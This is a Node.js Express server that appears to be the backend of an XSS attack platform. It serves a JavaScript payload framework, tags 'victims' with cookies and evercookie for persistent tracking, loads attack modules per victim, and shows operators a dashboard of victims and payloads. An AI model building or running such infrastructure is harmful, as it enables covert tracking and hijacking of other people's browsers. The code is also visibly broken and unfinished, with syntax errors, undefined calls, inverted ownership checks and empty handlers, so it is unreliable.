var express = require('express'),
    session = require('express-session'),
    cookieParser = require('cookie-parser'),
    bodyParser = require('body-parser'),
    evercookie = require('evercookie'),
    mongoose = require('mongoose'),
    logger = require('morgan'),
    crypto = require('crypto'),
    csrf = require('csurf'),
    ejs = require('ejs'),
    fs = require('fs'),
    app = express(),
    server = require('http').createServer(app),
    expressWs = require('express-ws')(app, server);

//   数据库
var sql = require('./models');
mongoose.connect(sql.Db);

//   模板引擎
app.set('view engine', 'ejs');
app.engine('html', ejs.renderFile);

//   其它
app.use(logger());
app.use(cookieParser());
app.use(evercookie.backend());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded());
app.use(session({
    secret:'session'
}));
app.use(csrf());
function err404(req, res, next){
    return res.send(404, '( ・_・)');
};
app.use('/static', express.static(__dirname+'/static'));
app.use('/home', function(req, res, next){
    if(!req.session.user){return err404(req, res, next)};
    res.locals.token = req.csrfToken();
    res.header('X-Frame-Options', 'DENY');
    next();
});
function getmd5(str){
    return crypto.createHash('md5').update(str).digest('hex');
}

//   TODO 长逻辑, XSS处理部分
app.all('/', function(req, res){
    // 返回XSS JS 框架
    res.header('Content-Type', 'application/javascript');
    return res.render('bungeegum', {
        domain:req.header('host'),
        id:req.query.i
    });
});
app.all('/i/', function(req, res){
    // 返回模块
    //TODO who id use "Canvas Fingerprinting"
    var id = req.params.i;
    var who = req.cookies.who;
    sql.Victim.findOne({who:who}, function(err, info){
        if(info){
            return render('load', {
                modules:info.modules
            });
        };
        sql.Item.findById(id, function(err, info){
            who = getmd5(info.owner+id+Date.now());
            res.cookie('who', who);
            sql.Victim.create({
                owner:info.owner,
                who:who,
                name:info.name+Date.now(),
                payload:info.payload,
                modules:info.modules,
                status:{},
                now:Date.now()
            }, function(){
                return render('load', {
                    modules:info.modules
                });
            });
        });
    });
});
function handle(re, modules, owner, victim, type){
    var Process = {
        Priority:[],
        Accepted:[],
        Dealwith:[],
        Returns:[]
    };
    var share = {};
    for(var n in modules){
        var m = require('./'+n);
        (m.type==type)&&Process[m.priority].push(m);
    };
    for(var p in Process){
        p.forEach(function(m){
            var share[m.name] = m(
                re,
                owner,
                modules[m.name],
                victim,
                share
            );
        });
    };
};
function httppage(req, res){
    var pageid = req.params.uri;
    sql.Page.findOne({uri:pageid}, function(err, info){
        if(info.type != 'http'){return null};
        var owner = req.session.user&&(req.session.user.name == info.owner);
        handle({q:req, s:res}, info.modules, owner, sql.Victim, 'http');
    });
};
function online(who, on){
    sql.Victim.findOne({who:who}, function(err, info){
        info&&sql.Victim.update({who:who}, {
            now:on
        }, function(err, info){
            sql.Victim.seva();
        });
    });
};
function wspage(ws, req){
    var pageid = req.params.uri;
    sql.Page.findOne({uri:pageid}, function(err, info){
        var page = info;
        if(info.type != 'ws'){return null};
        ws.on('open', function(){
            if(owner){return null};
            online(who, 'online');
        });
        ws.on('close', function(){
            if(owner){return null};
            online(who, Date.now());
        });
        ws.on('message', function(msg){
            var owner = req.session.user&&(req.session.user.name == info.owner);
            handle({q:req, s:ws}, info.modules, owner, sql.Victim, 'ws');
        });
    });
};
app.all('/h/:uri', httppage);
app.ws('/h/:uri', wspage);
app.all('/home/page/:uri', httppage);
app.ws('/home/page/:uri', wspage);

//   用户相关
app.route('/login')
    .get(function(req, res){
        return res.render('login', {err:''});
    })
    .post(function(req, res){
        var name = req.body.name;
        var passwd = req.body.passwd;
        sql.User.findOne({name:name}, function(err, info){
            if(!info){return res.render('login', {err:'login failed.'})};
            sql.User.findOne({
                name:name,
                passwd:getmd5(passwd+info.salt)
            }, function(err, info){
                if(!info){return res.render('login', {err:'login failed.'})};
                req.session.user = info;
                return res.redirect('/home');
            });
        });
    });
app.post('/home/logout', function(req, res){
    req.session.user = null;
    return res.redirect('/login');
});

// 用户页面
app.get('/home', function(req, res){
    var victim, page;
    sql.Victim.find({owner:req.session.user.name}, function(err, info){
        victims = info;
        sql.Page.find({owner:req.session.user.name}, function(err, info){
            pages = info;
            sql.Item.find({owner:req.session.user.name}, function(err, info){
                items = info;
                return res.render('home', {
                    items:items,
                    victims:victims,
                    pages:pages
                });
            });
        });
    });
});

app.get('/home/item/:name', function(req, res){
    sql.Item.findOne({id:req.params.name}, function(err, info){
        if(info.owner == req.session.user.name){return null};
        return res.render('edit', {
            items:info
        });
    });
});
app.get('/home/victim/:name', function(req, res){
    sql.Victim.findOne({id:req.params.name}, function(err, info){
        if(info.owner == req.session.user.name){return null};
        return res.render('edit', {
            victims:info
        });
    });
});
app.get('/home/page/:uri/edit', function(req, res){
    sql.Page.findOne({uri:req.params.uri}, function(err, info){
        if(info.owner == req.session.user.name){return null};
        return res.render('editpage', {
            pages:info
        });
    });
});

//   TODO 设置
app.post('/home/victim/:name/edit', function(){});
app.post('/home/page/:uri/edit', function(){});

app.use('*', err404);
app.listen(process.env.OPENSHIFT_NODEJS_PORT || 8080,
    process.env.OPENSHIFT_NODEJS_IP);
